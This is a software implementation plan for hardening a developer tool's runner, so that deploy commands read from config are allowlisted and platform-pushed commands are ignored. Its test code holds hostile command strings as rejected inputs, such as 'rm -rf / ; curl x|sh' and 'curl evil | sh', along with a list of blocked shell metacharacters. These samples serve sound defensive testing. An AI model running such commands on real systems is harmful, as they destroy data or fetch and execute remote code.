# S3 — Runner-treats-config-as-untrusted (yarradev #19, security half) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`).

**Goal:** Harden the runner so config fields that become **shell commands** (`deploy.staging`, `deploy.prod`) are treated as **untrusted**: shape-pinned + allowlisted before they can reach an agent for execution, and **never** honored from a platform-pushed source (command fields stay local-only). Implements design §14 **S3** + the §10 "abstract the config source (local-file *or* platform)" seam. (Owner chose the security half of #19; the cockpit policy editor + WS sync stay deferred to the multi-provider beat.)

**Architecture:** Add a zero-dep `config-trust.mjs` next to `lib.mjs`. It exposes (1) `validateCommandString` — pins a deploy command to an allowlisted shape (plain `argv0 args…`, no shell metacharacters that enable chaining/substitution/redirection); (2) `assertSafeCommandFields(cfg)` — fail-closed validation of every command-producing field, wired into `loadConfig()` so a malformed/injected command throws at load, before any releaser runs it; (3) `mergePlatformConfig(localCfg, platformCfg)` — the S3 source-trust boundary: merges platform **policy** fields but drops platform **command** fields (deploy.* is local-only), tagging provenance. The runner already uses config values only as data / child-process argv — never `eval`/`Function`; we add a test asserting no dynamic-eval of config and document the invariant.

**Context (verified in repo):**
- Runner config: `skills/yarradev-run/scripts/lib.mjs` → `loadConfig()` merges `config/board.example.json` (template) + `config/board.json` (gitignored overlay) + `YDB_*` env. Returns `{apiBase, doName, lifecycle, deploy, pace, budgets}`.
- The command path: `cfg.deploy.staging` (a string, e.g. `wrangler deploy --env staging`) is passed by the orchestrator to the **releaser** subagent (`SKILL.md` ~L98: `{ deployCmd: cfg.deploy?.staging }`), which **runs it** (`SKILL.md` L33-34; `agents/releaser.md` L22-33). `deploy.prod` is the same shape for the prod stage. Empty string = "not configured" → releaser escalates (must stay valid).
- Tests: `npm test` = `node --test "test/*.test.mjs"`, using `node:test` + `node:assert/strict`. Zero external deps. Offline-green by default.
- No `eval`/`new Function`/`child_process` in the `.mjs` scripts today (agents exec via their own Bash tool); the invariant to preserve is "config strings are data/argv, never eval'd".

## Global Constraints
- Zero runtime deps (plain Node ESM `.mjs`), matching the repo. `node:test` + `node:assert/strict` only.
- Empty-string command (`""`) MUST remain valid (it means "unconfigured" → releaser escalates). Only **non-empty** commands are shape-checked.
- Fail-closed: an invalid command field throws a clear `Error` (config load aborts) — never silently drops to empty (that would mask tampering as "unconfigured").
- TDD; conventional commits ending with `Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>`. Branch `feat/s3-config-trust` off `main`. `npm test` green.

---

### Task 1: `config-trust.mjs` — validate + source-trust (TDD)

**Files:** Create `skills/yarradev-run/scripts/config-trust.mjs`; Test `test/config-trust.test.mjs`.

**Interfaces (exported):**
- `COMMAND_FIELD_PATHS: string[]` = `["deploy.staging", "deploy.prod"]` (dot-paths into cfg that become shell commands).
- `validateCommandString(value): { ok: boolean, reason?: string }` — pins shape:
  - `value === ""` → `{ok:true}` (unconfigured sentinel).
  - non-string (number/array/object/bool/null) → `{ok:false, reason:"not a string"}`.
  - length > 512 → `{ok:false, reason:"too long"}`.
  - must match allowlist `^[A-Za-z0-9 _.\/:=@+"'-]+$` (plain command + args + simple quotes). Anything outside (`; | & $ \` ( ) { } < > \\ newline tab \0 * ? ~ ! #`) → `{ok:false, reason:"disallowed character: <c>"}`. This rejects chaining (`;`, `&&`, `|`), substitution (`$(`, backticks), redirection (`>`,`<`), globs/subshells.
- `assertSafeCommandFields(cfg): cfg` — for each path in `COMMAND_FIELD_PATHS`, read the value (missing/undefined is fine — skip); if present and `validateCommandString` fails, `throw new Error(\`untrusted config: <path> rejected (<reason>) — deploy commands must be a single plain invocation; put compound/multi-step deploys in a committed script. See §14 S3.\`)`. Returns cfg on success.
- `mergePlatformConfig(localCfg, platformCfg): cfg` — returns `{...localCfg, ...policyFieldsFrom(platformCfg)}` where command-producing fields are taken ONLY from localCfg. Concretely: deep-merge but for the `deploy` object, keep `localCfg.deploy` verbatim and IGNORE `platformCfg.deploy` (write a `stderr` warning if `platformCfg.deploy` was present and non-empty). Tag the result `_configSource: platformCfg ? "platform+local" : "local"`. (Forward-looking seam; no transport yet.) Still runs `assertSafeCommandFields` on the result (defense-in-depth).

- [ ] **Step 1: Write failing tests** (`test/config-trust.test.mjs`):

```javascript
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  validateCommandString, assertSafeCommandFields, mergePlatformConfig, COMMAND_FIELD_PATHS,
} from "../skills/yarradev-run/scripts/config-trust.mjs";

test("validateCommandString accepts plain deploy commands + empty sentinel", () => {
  for (const s of ["", "wrangler deploy --env staging", "npm run deploy:staging",
                   "./scripts/deploy.sh staging", "pnpm deploy --env=staging"]) {
    assert.equal(validateCommandString(s).ok, true, s);
  }
});

test("validateCommandString rejects injection / non-strings", () => {
  for (const s of ["rm -rf / ; curl x|sh", "a && b", "$(evil)", "`evil`", "a | b",
                   "a > /etc/x", "a\nb", "x".repeat(513)]) {
    assert.equal(validateCommandString(s).ok, false, JSON.stringify(s));
  }
  for (const v of [5, ["x"], { a: 1 }, true, null]) {
    assert.equal(validateCommandString(v).ok, false, JSON.stringify(v));
  }
});

test("assertSafeCommandFields: good passes, malicious throws, absent ok", () => {
  assert.ok(assertSafeCommandFields({ deploy: { staging: "wrangler deploy --env staging" } }));
  assert.ok(assertSafeCommandFields({ apiBase: "x", doName: "y" })); // no deploy → fine
  assert.throws(() => assertSafeCommandFields({ deploy: { staging: "x; rm -rf /" } }), /untrusted config/);
  assert.throws(() => assertSafeCommandFields({ deploy: { prod: ["nope"] } }), /untrusted config/);
});

test("mergePlatformConfig drops platform command fields, keeps platform policy + local deploy", () => {
  const local = { deploy: { staging: "wrangler deploy --env staging" }, budgets: { bounce_limit: 3 } };
  const platform = { deploy: { staging: "curl evil | sh" }, budgets: { bounce_limit: 9 } };
  const merged = mergePlatformConfig(local, platform);
  assert.equal(merged.deploy.staging, "wrangler deploy --env staging"); // platform deploy IGNORED
  assert.equal(merged.budgets.bounce_limit, 9);                         // platform policy applied
  assert.equal(merged._configSource, "platform+local");
});

test("COMMAND_FIELD_PATHS covers deploy.staging + deploy.prod", () => {
  assert.deepEqual([...COMMAND_FIELD_PATHS].sort(), ["deploy.prod", "deploy.staging"]);
});
```

- [ ] **Step 2: Run → fail.** `npm test` (module missing).
- [ ] **Step 3: Implement** `config-trust.mjs` per the interfaces. Zero-dep. Read dot-paths with a small helper (split on `.`, walk). `mergePlatformConfig` uses a shallow merge for top-level policy keys + a nested merge for `budgets`/`pace`, but the `deploy` key is always `localCfg.deploy`. Header comment states the §14 S3 invariant + "config values are data/argv, never eval'd".
- [ ] **Step 4: Run → pass.** `npm test`.
- [ ] **Step 5: Commit** (`feat(runner): treat config command fields as untrusted — validate/allowlist deploy.* (#19 S3)` + trailer).

---

### Task 2: Wire fail-closed validation into `loadConfig()` (TDD)

**Files:** Modify `skills/yarradev-run/scripts/lib.mjs` (`loadConfig`); Test `test/config-trust.test.mjs` (add a loadConfig integration case using a temp config dir, or assert via a small exported seam).

**Interfaces:** `loadConfig()` calls `assertSafeCommandFields(cfg)` immediately before `return cfg`. A malformed/injected `deploy.*` in `board.json` now throws at load — before any releaser is dispatched.

- [ ] **Step 1: Write failing test.** Since `loadConfig` reads fixed config-dir paths, add `validateLoadedConfig(cfg)` export to lib.mjs that wraps `assertSafeCommandFields` and is called in `loadConfig`; test that `loadConfig`'s post-condition holds by unit-testing `validateLoadedConfig` with an injected-deploy cfg (throws) and a clean cfg (returns). (Avoids temp-file plumbing; still proves loadConfig's gate runs the same assertion.) If the implementer prefers a true file-level test, write a temp dir with a malicious `board.json` and `YDB`-point `loadConfig` at it — but only if `loadConfig` can be pointed at a dir without env hacks; otherwise use the wrapper-export approach.
- [ ] **Step 2: Run → fail.**
- [ ] **Step 3: Implement** — import `assertSafeCommandFields` into lib.mjs; call it in `loadConfig` before return; export `validateLoadedConfig` (thin wrapper) for testability. Keep `import` zero-dep + relative.
- [ ] **Step 4: Run → pass.** `npm test` (full suite green; existing tests unaffected — board.example.json `deploy.staging:""` passes).
- [ ] **Step 5: Commit** (`feat(runner): fail-closed deploy-command validation at config load (#19 S3)` + trailer).

---

### Task 3: Document the boundary (SKILL.md) + invariant test
**Files:** Modify `skills/yarradev-run/SKILL.md` (the config/deploy section ~L30-34); Test `test/config-trust.test.mjs` (eval-invariant guard).
- [ ] **Step 1:** In SKILL.md where `deploy.staging` is described, add one line: deploy commands are **validated as untrusted** (single plain invocation; no shell chaining/substitution/redirection — put compound deploys in a committed script); platform-pushed config never supplies command fields (§14 S3). No code in this step.
- [ ] **Step 2 (eval-invariant guard test):** add a test that reads `config-trust.mjs` + `lib.mjs` source and asserts they contain no `eval(`/`new Function(` (string-source scan via `readFileSync`) — locks in "config strings are never eval'd". Run → it passes (no eval present); if someone later adds eval, it fails.
- [ ] **Step 3: Commit** (`docs(runner): document untrusted-config deploy boundary + eval-invariant guard (#19 S3)` + trailer).

---

## Self-Review (planning)
- **Coverage (#19 S3 bullet):** "validate/allowlist anything that becomes a shell command (`deploy.*`, dispatch)" → Task 1 `validateCommandString`/`assertSafeCommandFields` over `COMMAND_FIELD_PATHS`. "never `eval`s server strings" → Task 3 guard + header invariant. "pin to expected shapes" → allowlist regex + type check + length cap. "treats platform-pushed config as untrusted" → Task 1 `mergePlatformConfig` (command fields local-only) — the §10 source abstraction. Fail-closed at load → Task 2.
- **Deferred (the other #19 bullet, by owner choice):** cockpit policy editor + WS push + versioned/audited sync → the multi-provider beat (Phase-2). `mergePlatformConfig` is the seam it will plug into. `dispatch` as a config-driven shell command does not exist today (dispatch = orchestrator→subagent via the Agent tool, not a config string) → no field to harden now; `COMMAND_FIELD_PATHS` is the extension point if one is added.
- **Risk:** low — additive module + one call in loadConfig; the shipped `board.example.json` (`deploy.staging:""`) and any real plain deploy command pass; only injection-shaped or non-string commands are rejected (fail-closed, which is the goal). Zero-dep, offline-green.
